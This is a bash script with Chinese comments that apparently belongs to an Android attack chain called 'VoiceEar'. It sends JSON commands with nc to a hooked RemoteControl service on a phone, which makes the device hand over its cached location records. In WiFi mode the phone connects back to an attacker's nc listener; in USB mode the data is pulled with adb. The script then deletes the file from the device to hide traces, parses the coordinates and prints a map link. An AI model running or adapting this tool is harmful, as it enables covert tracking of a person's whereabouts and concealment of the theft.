#!/bin/bash
# steal-location.sh
# 通过 VoiceEar 攻击链触发地理位置明文窃取
# 支持两种连接方式：
#   1) USB 数据线（默认）：设备写文件到 /sdcard 后 adb pull
#   2) WiFi：设备主动回传 JSON 到攻击者监听端口
#
# 用法:
#   ./scripts/steal-location.sh                              # 默认 USB，抓取当前缓存位置
#   ./scripts/steal-location.sh --wifi 192.168.228.40       # WiFi 模式，抓取当前缓存位置

# ── 先处理 --wifi 参数（在 source common.sh 之前）────────────────────────────
FORCE_WIFI=false
DEVICE_WIFI_IP=""

if [ "$1" = "--wifi" ]; then
    FORCE_WIFI=true
    DEVICE_WIFI_IP="$2"
    shift 2
fi

source "${0%/*}/common.sh"

ACTION_USB="steal_location_file"
ACTION_WIFI="steal_location"
REMOTE_FILE="/sdcard/location_theft_raw.json"

OUTPUT_DIR="/home/ningfive/AndroidStudioProjects/VA-protect-feat-backtrace/VA-protect-feat-backtrace"
OUTPUT_FILE="$OUTPUT_DIR/location_$(date +%Y%m%d_%H%M%S).json"

# ── 检测连接方式 ───────────────────────────────────────────────────────────────
echo "================================================"
echo " VoiceEar - 地理位置明文窃取"
echo "================================================"
echo "[*] 检测设备连接..."

USB_DEVICE=$(adb devices | grep -v "List of devices" | grep "device$" | head -1 | awk '{print $1}')

if [ -n "$USB_DEVICE" ] && [ "$FORCE_WIFI" = false ]; then
    echo "[+] 检测到 USB 连接: $USB_DEVICE"
    CONNECT_MODE="usb"
elif [ "$FORCE_WIFI" = true ] || [ -z "$USB_DEVICE" ]; then
    if [ -z "$DEVICE_WIFI_IP" ]; then
        echo "[!] 请指定设备 WiFi IP: ./steal-location.sh --wifi <device_ip>"
        exit 1
    fi

    echo "[*] 使用 WiFi 模式，设备 IP: $DEVICE_WIFI_IP"
    CONNECT_MODE="wifi"
    DEVICE_IP="$DEVICE_WIFI_IP"
else
    echo "[!] 未检测到设备连接"
    echo "    USB 模式: 连接数据线"
    echo "    WiFi 模式: ./steal-location.sh --wifi <device_ip>"
    exit 1
fi

echo "[*] 连接模式: $CONNECT_MODE"
echo "[*] Target: $DEVICE_IP:$PORT (RemoteControl)"
echo "[*] 结果将保存至: $OUTPUT_FILE"

if [ "$CONNECT_MODE" = "wifi" ]; then
    # 设备主动回连攻击者监听端口
    RECV_PORT=25006
    PC_IP="192.168.228.63"  # 改为你 Windows 主机在局域网中的 IP

    CMD="{ \"Action\": \"$ACTION_WIFI\", \"ServerAddress\": \"$PC_IP\", \"ServerPort\": $RECV_PORT }"

    echo "[*] 指令: $CMD"
    echo "[*] 发送攻击指令到 RemoteControl ($DEVICE_IP:$PORT)..."
    echo "$CMD" | nc -w 5 "$DEVICE_IP" "$PORT"

    if [ $? -ne 0 ]; then
        echo "[!] 指令发送失败，请确认设备在同一局域网且 RemoteControl 正在运行"
        exit 1
    fi

    echo "[+] 指令已发送，等待设备回传数据 (监听 0.0.0.0:$RECV_PORT)..."
    echo "[i] 注意：需在 Windows 管理员 PowerShell 中配置好 portproxy 25006 -> WSL2:25006"
    nc -l $RECV_PORT > "$OUTPUT_FILE"
    RECV_RC=$?

    if [ $RECV_RC -ne 0 ]; then
        echo "[!] 回传接收失败"
        exit 1
    fi
else
    # USB 模式：设备写本地文件 + adb pull
    CMD="{ \"Action\": \"$ACTION_USB\", \"output\": \"$REMOTE_FILE\", \"ServerAddress\": \"127.0.0.1\", \"ServerPort\": 0 }"

    echo "[*] 指令: $CMD"
    echo "[*] 发送攻击指令到 RemoteControl ($DEVICE_IP:$PORT)..."
    echo "$CMD" | nc -w 5 "$DEVICE_IP" "$PORT"

    if [ $? -ne 0 ]; then
        echo "[!] 指令发送失败，请确认 adb forward tcp:$PORT 已建立，且 Hook 已生效"
        exit 1
    fi

    echo "[+] 指令已发送，等待设备写入文件..."
    sleep 3

    echo "[*] 正在拉取战果文件: $REMOTE_FILE"
    adb pull "$REMOTE_FILE" "$OUTPUT_FILE"
    PULL_RC=$?

    if [ $PULL_RC -eq 0 ]; then
        adb shell rm -f "$REMOTE_FILE"
        echo "[*] 痕迹清理：设备上的临时文件已删除"
    else
        echo "[!] 拉取失败，可能由于权限问题或服务未正常响应"
        adb shell rm -f "$REMOTE_FILE"
        exit 1
    fi
fi

echo ""
echo "================================================"
echo " 数据接收完成"
echo " 文件: $OUTPUT_FILE ($(wc -c < "$OUTPUT_FILE") bytes)"
echo "================================================"

if [ ! -s "$OUTPUT_FILE" ]; then
    echo "[!] 文件为空，可能窃取失败"
    exit 1
fi

if command -v jq &>/dev/null; then
    COUNT=$(jq 'length' "$OUTPUT_FILE" 2>/dev/null || echo "N/A")

    if [ "$COUNT" -eq 0 ]; then
        echo "[!] 未获取到位置信息，可能设备尚无可用缓存定位"
        echo "    建议先在手机打开一次地图 App 再重试"
    else
        echo "[+] 成功捕获 $COUNT 条定位记录"
        jq -r '.[] | "[\(.time)] 定位方式: \(.provider)\n纬度: \(.latitude)\n经度: \(.longitude)\n精度误差: \(.accuracy_meters) 米\n海拔: \(.altitude) 米\n"' "$OUTPUT_FILE"

        LAT=$(jq -r '.[0].latitude' "$OUTPUT_FILE")
        LNG=$(jq -r '.[0].longitude' "$OUTPUT_FILE")
        echo "================================================"
        echo "地图链接: https://www.google.com/maps/search/?api=1&query=$LAT,$LNG"
    fi
else
    echo "[i] 提示: 安装 jq 可格式化输出 (sudo apt install jq)"
    cat "$OUTPUT_FILE"
fi

echo "================================================"
echo " 明文数据已保存至: $OUTPUT_FILE"
